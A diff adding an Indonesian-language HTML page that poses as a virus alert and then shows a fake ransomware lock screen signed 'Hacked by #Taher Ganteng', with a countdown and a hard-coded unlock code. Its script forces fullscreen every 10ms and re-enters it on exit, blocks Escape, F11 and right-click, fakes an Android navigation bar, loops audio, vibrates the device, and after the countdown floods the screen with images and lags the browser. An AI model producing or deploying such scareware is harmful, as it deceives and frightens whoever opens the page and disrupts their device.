@@ -1,0 +1,666 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>⚠️ VIRUS DETECTED ⚠️</title>
+  <style>
+    * {
+      -webkit-tap-highlight-color: transparent;
+      -webkit-touch-callout: none;
+      -webkit-user-select: none;
+      -moz-user-select: none;
+      -ms-user-select: none;
+      user-select: none;
+    }
+    
+    body {
+      margin: 0;
+      padding: 0;
+      background: black;
+      color: white;
+      font-family: Arial, sans-serif;
+      overflow: hidden;
+      position: fixed;
+      width: 100%;
+      height: 100%;
+      touch-action: none;
+    }
+    
+    /* Custom Alert Box - DIPERBESAR */
+    #customAlert {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: #000;
+      border: 5px solid red;
+      padding: 30px;
+      border-radius: 15px;
+      z-index: 10001;
+      text-align: center;
+      box-shadow: 0 0 30px red;
+      color: white;
+      width: 85%;
+      max-width: 500px;
+      font-size: 1.2em;
+    }
+
+    #customAlert h2 {
+      font-size: 2em;
+      margin-bottom: 20px;
+    }
+
+    #customAlert p {
+      font-size: 1.5em;
+      margin-bottom: 25px;
+    }
+
+    #customAlert button {
+      margin-top: 20px;
+      padding: 15px 60px;
+      border: none;
+      background: red;
+      color: white;
+      font-size: 1.5em;
+      cursor: pointer;
+      border-radius: 8px;
+    }
+    
+    .container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100%;
+      padding: 20px;
+      box-sizing: border-box;
+      display: none; /* Awalnya disembunyikan sampai alert diklik */
+    }
+    
+    .virus-img {
+      max-width: 80%;
+      height: auto;
+      margin-bottom: 20px;
+      border: 3px solid red;
+      box-shadow: 0 0 5px red;
+      animation: pulse 2s infinite;
+    }
+    
+    .warning-text {
+      font-size: 8vw;
+      font-weight: 900;
+      color: red;
+      text-shadow: 0 0 10px #ff0000, 0 0 20px #ff0000;
+      text-align: center;
+      margin-bottom: 10px;
+      animation: flicker 0.15s infinite;
+    }
+    
+    .instruction {
+      font-size: 4vw;
+      text-align: center;
+      margin-bottom: 20px;
+      color: lime;
+      text-shadow: 0 0 5px lime;
+    }
+    
+    .countdown {
+      font-size: 10vw;
+      font-weight: bold;
+      color: red;
+      margin-bottom: 20px;
+      text-shadow: 0 0 10px red;
+      animation: blink 1s infinite;
+    }
+    
+    .code-input {
+      display: flex;
+      justify-content: center;
+      margin-bottom: 20px;
+    }
+    
+    .code-digit {
+      width: 10vw;
+      height: 10vw;
+      margin: 0 2vw;
+      background: #111;
+      border: 2px solid red;
+      border-radius: 5px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 8vw;
+      color: lime;
+      text-shadow: 0 0 5px lime;
+    }
+    
+    .keypad {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 10px;
+      margin-bottom: 20px;
+      width: 80%;
+    }
+    
+    .key {
+      background: #222;
+      border: 2px solid red;
+      border-radius: 5px;
+      height: 15vw;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 6vw;
+      color: white;
+      cursor: pointer;
+    }
+    
+    .key:active {
+      background: #ff0000;
+    }
+    
+    .delete-key {
+      grid-column: span 3;
+      background: #500000;
+      font-size: 5vw;
+    }
+    
+    /* Navigasi Android Palsu */
+    .fake-navigation-bar {
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      width: 100%;
+      height: 60px;
+      background: rgba(15, 15, 15, 0.95);
+      display: flex;
+      justify-content: space-around;
+      align-items: center;
+      padding: 0 20%;
+      box-sizing: border-box;
+      display: none;
+      z-index: 10000;
+    }
+    
+    .nav-button {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      width: 19px;
+      height: 19px;
+    }
+    
+    .back-button {
+      border: 2px solid #fff;
+      width: 14px;
+      height: 14px;
+    }
+    
+    .home-button {
+      border: 2px solid #fff;
+      border-radius: 50%;
+      width: 15px;
+      height: 15px;
+    }
+    
+    .recent-button {
+      width: 25px;
+      height: 25px;
+    }
+    
+    .recent-button svg {
+      width: 26px;
+      height: 26px;
+      display: block;
+    }
+    
+    /* Efek virus setelah waktu habis */
+    .virus-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      pointer-events: none;
+      z-index: 9999;
+      display: none;
+    }
+    
+    .virus-particle {
+      position: absolute;
+      max-width: 20vw;
+      animation: floatAround 10s linear infinite;
+      opacity: 0.8;
+      filter: drop-shadow(0 0 5px red);
+    }
+    
+    .white-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: white;
+      opacity: 0;
+      pointer-events: none;
+      z-index: 100000;
+    }
+    
+    /* Animasi */
+    @keyframes pulse {
+      0% { transform: scale(1); }
+      50% { transform: scale(1.05); }
+      100% { transform: scale(1); }
+    }
+    
+    @keyframes flicker {
+      0% { opacity: 1; }
+      50% { opacity: 0.7; }
+      100% { opacity: 1; }
+    }
+    
+    @keyframes blink {
+      0% { opacity: 1; }
+      50% { opacity: 0.3; }
+      100% { opacity: 1; }
+    }
+    
+    @keyframes floatAround {
+      0% { transform: translate(0, 0) rotate(0deg); }
+      25% { transform: translate(100px, 50px) rotate(90deg); }
+      50% { transform: translate(50px, 100px) rotate(180deg); }
+      75% { transform: translate(0, 50px) rotate(270deg); }
+      100% { transform: translate(0, 0) rotate(360deg); }
+    }
+    
+    @keyframes flash {
+      0% { opacity: 0; }
+      50% { opacity: 0.8; }
+      100% { opacity: 0; }
+    }
+  </style>
+</head>
+<body>
+  <!-- Alert -->
+  <div id="customAlert">
+    <h2>⚠️ VIRUS TERDETEKSI ⚠️</h2>
+    <p>Tekan OKE untuk melanjutkan</p>
+    <button id="alertButton">OKE</button>
+  </div>
+
+  <div class="container" id="mainContainer">
+    <img src="66286.jpg" alt="VIRUS" class="virus-img">
+    <div class="warning-text">🔒 RANSOMWARE 🔒</div>
+    <div class="instruction">🚫Sistem telah terkunci🚫, masukkan kode di bawah
+Hacked by #Taher Ganteng</div>
+    
+    <div class="countdown" id="countdown">00:15</div>
+    
+    <div class="code-input">
+      <div class="code-digit" id="digit1">-</div>
+      <div class="code-digit" id="digit2">-</div>
+      <div class="code-digit" id="digit3">-</div>
+      <div class="code-digit" id="digit4">-</div>
+    </div>
+    
+    <div class="keypad">
+      <div class="key" data-value="1">1</div>
+      <div class="key" data-value="2">2</div>
+      <div class="key" data-value="3">3</div>
+      <div class="key" data-value="4">4</div>
+      <div class="key" data-value="5">5</div>
+      <div class="key" data-value="6">6</div>
+      <div class="key" data-value="7">7</div>
+      <div class="key" data-value="8">8</div>
+      <div class="key" data-value="9">9</div>
+      <div class="key" data-value="0">0</div>
+      <div class="key delete-key" id="delete-key">HAPUS</div>
+    </div>
+  </div>
+  
+  <div class="virus-overlay" id="virusOverlay"></div>
+  <div class="white-overlay" id="whiteOverlay"></div>
+  
+  <!-- Navigasi Android Palsu -->
+  <div class="fake-navigation-bar">
+    <div class="nav-button back-button"></div>
+    <div class="nav-button home-button"></div>
+    <div class="nav-button recent-button">
+      <svg viewBox="0 0 100 100" width="25" height="25">
+        <polygon points="50,15 20,85 80,85" fill="none" stroke="white" stroke-width="4"/>
+      </svg>
+    </div>
+  </div>
+
+  <audio id="audio" loop>
+    <source src="virus.mp3" type="audio/mp3">
+  </audio>
+
+  <script>
+    // Variabel global
+    let isFullscreen = false;
+    let enteredCode = "";
+    let countdownTime = 15;
+    let countdownInterval;
+    let virusInterval;
+    let isCodeCorrect = false;
+    
+    // Dapatkan elemen yang diperlukan
+    const customAlert = document.getElementById('customAlert');
+    const alertButton = document.getElementById('alertButton');
+    const mainContainer = document.getElementById('mainContainer');
+    const countdownElement = document.getElementById('countdown');
+    const digit1 = document.getElementById('digit1');
+    const digit2 = document.getElementById('digit2');
+    const digit3 = document.getElementById('digit3');
+    const digit4 = document.getElementById('digit4');
+    const deleteKey = document.getElementById('delete-key');
+    const virusOverlay = document.getElementById('virusOverlay');
+    const whiteOverlay = document.getElementById('whiteOverlay');
+    const navBar = document.querySelector('.fake-navigation-bar');
+    const audio = document.getElementById('audio');
+    const keys = document.querySelectorAll('.key[data-value]');
+    
+    // Event listener untuk tombol alert
+    alertButton.addEventListener("click", () => {
+      // Tutup alert
+      customAlert.style.display = "none";
+      // Tampilkan konten utama
+      mainContainer.style.display = "flex";
+      // Fullscreen
+      goFullscreen();
+      // Munculkan navigasi palsu
+      navBar.style.display = "flex";
+      // Mulai efek
+      init();
+    });
+    
+    // Inisialisasi
+    function init() {
+      // Mulai fullscreen
+      aggressiveFullscreen();
+      
+      // Mulai countdown
+      startCountdown();
+      
+      // Setup event listener untuk keypad
+      keys.forEach(key => {
+        key.addEventListener('click', () => {
+          if (enteredCode.length < 4) {
+            enteredCode += key.getAttribute('data-value');
+            updateCodeDisplay();
+            checkCode();
+          }
+        });
+      });
+      
+      // Event listener untuk tombol hapus
+      deleteKey.addEventListener('click', () => {
+        enteredCode = "";
+        updateCodeDisplay();
+      });
+      
+      // Mulai efek suara dan getar
+      startAudio();
+      startVibration();
+    }
+    
+    // Update tampilan kode
+    function updateCodeDisplay() {
+      const digits = [digit1, digit2, digit3, digit4];
+      
+      for (let i = 0; i < 4; i++) {
+        if (i < enteredCode.length) {
+          digits[i].textContent = enteredCode[i];
+        } else {
+          digits[i].textContent = "-";
+        }
+      }
+    }
+    
+    // Cek kode
+    function checkCode() {
+      if (enteredCode.length === 4) {
+        if (enteredCode === "4234") {
+          isCodeCorrect = true;
+          // Kode benar - bebaskan perangkat
+          setTimeout(() => {
+            document.body.innerHTML = '<div style="display:flex;justify-content:center;align-items:center;height:100vh;background:black;color:white;font-size:24px;">Perangkat telah dibersihkan. Silakan restart perangkat Anda.</div>';
+            exitFullscreen();
+            stopAudio();
+            if (navigator.vibrate) navigator.vibrate(0);
+          }, 500);
+        }
+      }
+    }
+    
+    // Mulai countdown
+    function startCountdown() {
+      updateCountdownDisplay();
+      
+      countdownInterval = setInterval(() => {
+        countdownTime--;
+        updateCountdownDisplay();
+        
+        if (countdownTime <= 0) {
+          clearInterval(countdownInterval);
+          activateVirusMode();
+        }
+      }, 1000);
+    }
+    
+    // Update tampilan countdown
+    function updateCountdownDisplay() {
+      const minutes = Math.floor(countdownTime / 60);
+      const seconds = countdownTime % 60;
+      countdownElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+      
+      // Ubah warna menjadi merah saat waktu hampir habis
+      if (countdownTime <= 10) {
+        countdownElement.style.animationDuration = '0.5s';
+      }
+      
+      if (countdownTime <= 5) {
+        countdownElement.style.animationDuration = '0.2s';
+      }
+    }
+    
+    // Aktifkan mode virus setelah waktu habis
+    function activateVirusMode() {
+      // Tampilkan overlay virus
+      virusOverlay.style.display = 'block';
+      
+      // Buat banyak duplikat virus
+      for (let i = 0; i < 100; i++) {
+        createVirusParticle();
+      }
+      
+      // Terus buat virus baru
+      virusInterval = setInterval(createVirusParticle, 500);
+      
+      // Getar lebih kuat
+      if (navigator.vibrate) {
+        navigator.vibrate([200, 100, 200, 100, 200, 100, 500]);
+      }
+      
+      // Flash putih
+      const flashInterval = setInterval(() => {
+        whiteOverlay.style.animation = 'flash 0.3s';
+        setTimeout(() => {
+          whiteOverlay.style.animation = '';
+        }, 300);
+      }, 1000);
+      
+      // Lag dan delay sengaja
+      setInterval(() => {
+        // Buat lag dengan loop berat
+        for (let i = 0; i < 1000000; i++) {
+          // intentionally empty
+        }
+      }, 5000);
+    }
+    
+    // Buat partikel virus
+    function createVirusParticle() {
+      const virusParticle = document.createElement('img');
+      virusParticle.src = '66286.jpg';
+      virusParticle.classList.add('virus-particle');
+      
+      // Posisi acak
+      const x = Math.random() * window.innerWidth;
+      const y = Math.random() * window.innerHeight;
+      virusParticle.style.left = `${x}px`;
+      virusParticle.style.top = `${y}px`;
+      
+      // Ukuran acak
+      const size = 30 + Math.random() * 70;
+      virusParticle.style.width = `${size}px`;
+      
+      // Kecepatan animasi acak
+      const duration = 5 + Math.random() * 15;
+      virusParticle.style.animationDuration = `${duration}s`;
+      
+      virusOverlay.appendChild(virusParticle);
+      
+      // Hapus setelah selesai
+      setTimeout(() => {
+        if (virusParticle.parentNode) {
+          virusParticle.parentNode.removeChild(virusParticle);
+        }
+      }, duration * 1000);
+    }
+    
+    // Fungsi untuk fullscreen
+    function goFullscreen() {
+      const el = document.documentElement;
+      const requestFS = el.requestFullscreen || el.webkitRequestFullscreen || el.mozRequestFullScreen || el.msRequestFullscreen;
+      if (requestFS) requestFS.call(el);
+    }
+    
+    // Fungsi untuk keluar fullscreen
+    function exitFullscreen() {
+      const exitFS = document.exitFullscreen || document.webkitExitFullscreen || document.mozCancelFullScreen || document.msExitFullscreen;
+      if (exitFS) exitFS.call(document);
+    }
+    
+    // Fungsi untuk fullscreen paksa dengan lebih brutal
+    function requestFull() {
+      if (isCodeCorrect) return; // Jangan lock jika kode benar
+      
+      if (!isFullscreen) {
+        const el = document.documentElement;
+        const requestFullscreen = el.requestFullscreen || el.webkitRequestFullscreen || 
+                                 el.mozRequestFullScreen || el.msRequestFullscreen;
+        
+        if (requestFullscreen) {
+          try {
+            const promise = requestFullscreen.call(el);
+            if (promise && promise.catch) {
+              promise.catch(err => {
+                console.error('Error attempting to enable fullscreen:', err);
+                // Tetap coba lagi meskipun gagal
+                setTimeout(requestFull, 10);
+              });
+            }
+            isFullscreen = true;
+          } catch (err) {
+            console.error('Error attempting to enable fullscreen:', err);
+            setTimeout(requestFull, 10);
+          }
+        }
+      }
+    }
+    
+    // Coba fullscreen berulang kali dengan lebih agresif
+    function aggressiveFullscreen() {
+      // Coba segera
+      requestFull();
+      
+      // Coba setiap 10ms
+      setInterval(requestFull, 10);
+    }
+    
+    // Fungsi untuk getar
+    function startVibration() {
+      if (navigator.vibrate) {
+        const pattern = [100, 50, 100, 50, 100, 50, 200, 50, 100, 50, 100, 50, 100];
+        navigator.vibrate(pattern);
+        setInterval(() => {
+          if (!isCodeCorrect) navigator.vibrate(pattern);
+        }, 5000);
+      }
+    }
+    
+    // Fungsi untuk memutar audio
+    function startAudio() {
+      audio.volume = 0.7;
+      
+      // Coba putar audio dengan lebih agresif
+      function tryPlay() {
+        if (isCodeCorrect) return;
+        
+        const promise = audio.play();
+        if (promise !== undefined) {
+          promise.catch(error => {
+            // Coba lagi setelah 500ms
+            setTimeout(tryPlay, 500);
+          });
+        }
+      }
+      
+      // Coba putar beberapa kali
+      tryPlay();
+      setTimeout(tryPlay, 1000);
+      setTimeout(tryPlay, 2000);
+    }
+    
+    // Fungsi untuk menghentikan audio
+    function stopAudio() {
+      audio.pause();
+      audio.currentTime = 0;
+    }
+    
+    // Tangani perubahan fullscreen
+    document.addEventListener('fullscreenchange', exitHandler);
+    document.addEventListener('webkitfullscreenchange', exitHandler);
+    document.addEventListener('mozfullscreenchange', exitHandler);
+    document.addEventListener('MSFullscreenChange', exitHandler);
+    
+    function exitHandler() {
+      if (!document.fullscreenElement && !document.webkitIsFullScreen && 
+          !document.mozFullScreen && !document.msFullscreenElement) {
+        isFullscreen = false;
+        // Jika keluar dari fullscreen, segera coba kembali
+        if (!isCodeCorrect) {
+          setTimeout(requestFull, 10);
+        }
+      } else {
+        isFullscreen = true;
+      }
+    }
+    
+    // Blokir context menu (klik kanan)
+    document.addEventListener('contextmenu', function(e) {
+      e.preventDefault();
+      return false;
+    });
+    
+    // Blokir tombol escape dan F11
+    document.addEventListener('keydown', function(e) {
+      if (e.key === 'Escape' || e.key === 'F11') {
+        e.preventDefault();
+        if (!isCodeCorrect) requestFull();
+      }
+    });
+    
+    // Coba fullscreen juga saat pengguna mengklik/menyentuh layar
+    document.addEventListener('click', function() {
+      if (!isCodeCorrect) requestFull();
+    });
+    document.addEventListener('touchstart', function() {
+      if (!isCodeCorrect) requestFull();
+    });
+  </script>
+</body>
+</html>
